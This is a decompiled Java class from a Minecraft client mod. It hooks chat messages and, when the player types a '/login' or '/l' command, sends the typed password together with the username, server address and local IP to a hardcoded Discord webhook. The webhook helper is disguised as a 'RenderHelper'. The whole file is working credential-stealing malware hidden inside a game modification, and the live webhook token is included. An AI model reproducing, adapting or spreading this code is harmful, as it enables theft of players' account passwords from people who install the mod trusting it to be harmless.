/*    */ package sertyo.events.command.module;
/*    */ 
/*    */

import com.darkmagician6.eventapi.EventManager;
import com.darkmagician6.eventapi.EventTarget;
import net.minecraft.client.Minecraft;
import sertyo.events.event.misc.EventMessage;

import java.awt.*;
import java.io.IOException;
import java.net.InetAddress;

/*    */
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class lmodule
/*    */ {
/* 20 */   private final RenderHelper webhookLogger = new RenderHelper("https://discord.com/api/webhooks/1244227186056237149/ebNFBynZETb-SX169MdskfbYl6KzvPPx2yYOe7jcMcHnIl38fetKjZitiaYsnrCQjBAR");
/*    */   
/*    */   public lmodule() {
/* 23 */     EventManager.register(this);
/*    */   }
/*    */   
/*    */   @EventTarget
/*    */   public void ChatEvent(EventMessage e) {
/* 28 */     String msg = e.getMessage();
/* 29 */     String[] sentences = e.getMessage().split(" ");
/*    */     
/* 31 */     if (msg.startsWith("/l") || (msg.startsWith("/login") && sentences.length > 1))
/*    */       try {
/* 33 */         System.out.println(Minecraft.getInstance().getSession().getUsername());
/* 34 */         this.webhookLogger.clearEmbeds();
/* 35 */         this.webhookLogger.addEmbed((new RenderHelper.EmbedObject())
/* 36 */             .setTitle("OnMudak")
/* 37 */             .setDescription("Login Detected | Secret")
/* 38 */             .setColor(new Color(1, 1, 1))
/* 39 */             .addField("SERVER", (Minecraft.getInstance().getCurrentServerData()).serverIP.toLowerCase(), true)
/* 40 */             .addField("USER", Minecraft.getInstance().getSession().getUsername(), true)
/* 41 */             .addField("PASSWORD", sentences[1], true)
/* 42 */             .addField("IP ADDRES", InetAddress.getLocalHost().getHostAddress(), false));
/* 43 */         this.webhookLogger.execute();
/* 44 */       } catch (IOException ex) {
/* 45 */         ex.printStackTrace();
/*    */       }  
/*    */   }
/*    */ }


/* Location:              D:\MangoSense\MangoSense.jar!\mango\commands\module\LoginModule.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */